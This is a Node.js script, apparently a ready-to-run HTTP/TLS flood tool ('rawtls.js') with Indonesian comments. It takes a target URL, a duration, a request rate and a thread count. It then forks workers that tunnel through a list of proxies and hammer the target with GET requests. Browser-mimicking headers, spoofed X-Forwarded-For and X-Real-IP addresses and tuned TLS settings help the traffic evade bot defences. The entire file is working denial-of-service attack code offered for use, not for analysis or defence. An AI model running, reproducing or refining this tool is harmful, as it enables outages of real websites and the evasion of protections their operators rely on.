const net = require("net");
const http = require("http");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log(`Usage: node rawtls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://target.com 500 8 1`);
    process.exit();
}

// Cipher settings untuk TLS
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

// User Agents array langsung di dalam kode
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
];

// Baca proxy
var proxyFile = "proxy.txt";
var proxies = readLines(proxyFile);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);
const targetHost = parsedTarget.hostname;
const targetPort = parsedTarget.port || 443;
const targetPath = parsedTarget.path || "/";

// Cluster master
if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);
} else {
    // Worker: jalankan flooder dengan interval
    for (let i = 0; i < 10; i++) {
        setInterval(runFlooder, 0);
    }
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\n" +
            "Host: " + options.address + ":443\r\n" +
            "Proxy-Connection: Keep-Alive\r\n" +
            "User-Agent: " + randomElement(userAgents) + "\r\n\r\n";

        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200") || response.includes("HTTP/1.0 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error.message);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    try {
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
    } catch (err) {
        console.log(`Error reading ${filePath}: ${err.message}`);
        return [];
    }
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    if (!elements || elements.length === 0) return "";
    return elements[randomIntn(0, elements.length)];
}

function generateRandomIP() {
    return `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(1, 255)}`;
}

function generateRandomReferer() {
    const referers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://www.yahoo.com/",
        "https://" + targetHost + "/",
        "https://www.facebook.com/",
        "https://www.twitter.com/",
        "https://www.instagram.com/",
        ""
    ];
    return randomElement(referers);
}

// Header HTTP/1.1 yang lebih mirip browser
function buildHeaders(proxyIP) {
    const acceptList = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    ];

    const acceptLanguageList = [
        "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "en-US,en;q=0.9",
        "ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7",
        "zh-CN,zh;q=0.9,en;q=0.8"
    ];

    const secChUA = [
        '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        '"Microsoft Edge";v="121", "Not(A:Brand";v="99", "Chromium";v="121"',
        '"Brave";v="121", "Not(A:Brand";v="99", "Chromium";v="121"'
    ];

    const platformList = ["Windows", "macOS", "Linux", "Android", "iOS"];

    return {
        "Host": targetHost,
        "User-Agent": randomElement(userAgents),
        "Accept": randomElement(acceptList),
        "Accept-Language": randomElement(acceptLanguageList),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache, no-store, private, max-age=0",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Ch-Ua": randomElement(secChUA),
        "Sec-Ch-Ua-Mobile": randomElement(["?0", "?1"]),
        "Sec-Ch-Ua-Platform": randomElement(platformList),
        "X-Forwarded-For": proxyIP,
        "X-Real-IP": proxyIP,
        "Referer": generateRandomReferer()
    };
}

function runFlooder() {
    if (proxies.length === 0) {
        console.log("No proxies available");
        return;
    }

    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    if (parsedProxy.length < 2) return;

    const proxyIP = parsedProxy[0];
    const proxyPort = ~~parsedProxy[1];

    const proxyOptions = {
        host: proxyIP,
        port: proxyPort,
        address: targetHost + ":443",
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const tlsOptions = {
            port: targetPort,
            secure: true,
            ALPNProtocols: ["http/1.1"],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: targetHost,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: targetHost,
            secureProtocol: secureProtocol,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };

        const tlsConn = tls.connect(targetPort, targetHost, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.setMaxListeners(0);

        tlsConn.on("secureConnect", () => {
            // Kirim request HTTP/1.1 secara berulang
            const intervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const fakeIP = generateRandomIP();
                    const headers = buildHeaders(fakeIP);

                    // Build HTTP request
                    let requestStr = `GET ${targetPath} HTTP/1.1\r\n`;
                    for (const [key, value] of Object.entries(headers)) {
                        if (value) {
                            requestStr += `${key}: ${value}\r\n`;
                        }
                    }
                    requestStr += "\r\n";

                    tlsConn.write(requestStr);

                    // Optional: baca response tapi tidak diproses untuk efisiensi
                    tlsConn.resume();
                }
            }, 1000);

            // Cleanup interval jika koneksi mati
            tlsConn.once("close", () => {
                clearInterval(intervalAttack);
            });
        });

        tlsConn.on("error", (error) => {
            tlsConn.destroy();
            if (connection) connection.destroy();
        });

        tlsConn.on("close", () => {
            if (connection) connection.destroy();
        });
    });
}

process.on('uncaughtException', error => { });
process.on('unhandledRejection', error => { });
